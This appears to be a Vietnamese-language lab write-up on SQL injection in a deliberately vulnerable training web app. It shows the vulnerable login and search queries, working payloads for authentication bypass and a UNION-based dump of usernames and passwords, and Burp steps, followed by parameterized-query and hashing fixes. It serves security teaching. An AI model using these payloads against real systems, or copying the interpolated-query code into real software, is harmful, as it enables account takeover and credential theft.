# SQL Injection — Writeup

> **Mức độ:** Critical  
> **Vị trí:** `/login` (login form) · `/search` (search bar)  
> **CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command

---

## 1. SQL Injection là gì?

SQL Injection (SQLi) xảy ra khi ứng dụng nhúng dữ liệu người dùng trực tiếp vào câu truy vấn SQL mà không thực hiện escaping hay parameterization. Kẻ tấn công có thể chèn code SQL vào input để thay đổi logic truy vấn, bypass xác thực, hoặc dump toàn bộ database.

---

## 2. Vị trí lỗi trong VulnWebApp

### Điểm 1 — Login Form (`/login`)

```javascript
// server.js — app.post('/login')
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.prepare(query).get();
```

### Điểm 2 — Search (`/search`)

```javascript
// server.js — app.get('/search')
const query = `SELECT * FROM posts WHERE title LIKE '%${q}%' OR content LIKE '%${q}%'`;
db.prepare(query).all();
```

---

## 3. Cách khai thác

### 3.1 Login Bypass

**Mục tiêu:** Đăng nhập vào tài khoản admin mà không cần password.

**Payload (username field):**
```
' OR 1=1 --
```

**Câu SQL sau khi inject:**
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
```

`-- ` là comment trong SQL → bỏ qua điều kiện password.  
`OR 1=1` luôn đúng → trả về user đầu tiên trong bảng (thường là admin).

**Bước thực hiện:**
1. Truy cập `http://localhost:3000/login`
2. Username: `' OR 1=1 --`
3. Password: `anything` (bất kỳ)
4. Click **Login**
5. Đăng nhập thành công với quyền admin!

---

### 3.2 Login Bypass theo user cụ thể

**Payload:**
```
admin'--
```

**SQL:**
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
```

→ Bỏ qua password check, đăng nhập thẳng vào `admin`.

---

### 3.3 UNION-Based — Dump Users Table (qua Search)

**Mục tiêu:** Đọc toàn bộ bảng `users` kể cả password.

**Payload (search box):**
```
' UNION SELECT id,username,password,email,role,bio,avatar,created_at FROM users --
```

**SQL:**
```sql
SELECT * FROM posts 
WHERE title LIKE '%' UNION SELECT id,username,password,email,role,bio,avatar,created_at FROM users --%' 
OR content LIKE '%...'
```

**Kết quả:** Tất cả rows trong bảng `users` được trả về và render trên trang.

---

### 3.4 Error-Based — Information Disclosure

**Payload:**
```
'
```
(chỉ một dấu nháy đơn)

**Kết quả:** Server trả về error message chứa thông tin về SQLite và cấu trúc query.

---

## 4. Kết quả

| Attack | Result |
|--------|--------|
| `' OR 1=1 --` | Đăng nhập thành công với quyền admin |
| `admin'--` | Đăng nhập vào account admin |
| UNION SELECT | Dump toàn bộ username + password |
| `'` | SQL error → info disclosure |

---

## 5. Demo với BurpSuite

1. Mở BurpSuite → Proxy → Intercept ON
2. Submit login form
3. Trong Burp: thay đổi `username` thành `' OR 1=1 --`
4. Forward request
5. Observe: redirect to `/dashboard` với session hợp lệ

---

## 6. Cách Fix

### Fix 1: Dùng Parameterized Queries (Prepared Statements)

```javascript
// SECURE
const user = db.prepare(
  'SELECT * FROM users WHERE username = ? AND password = ?'
).get(username, password);
```

Dấu `?` là placeholder — driver tự động escape input, không cho phép SQL injection.

### Fix 2: Dùng ORM

```javascript
// Với Sequelize / Prisma
const user = await User.findOne({ where: { username, password } });
```

### Fix 3: Hash Password (bắt buộc)

```javascript
const bcrypt = require('bcrypt');

// Khi đăng ký:
const hash = await bcrypt.hash(password, 12);
db.prepare('INSERT INTO users (username, password) VALUES (?,?)').run(username, hash);

// Khi login:
const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
const valid = await bcrypt.compare(inputPassword, user.password);
```

### Fix 4: Input Validation

```javascript
// Kiểm tra input trước khi dùng
if (!/^[a-zA-Z0-9_]{3,30}$/.test(username)) {
  return res.status(400).json({ error: 'Invalid username format' });
}
```

---

## 7. Tham khảo

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
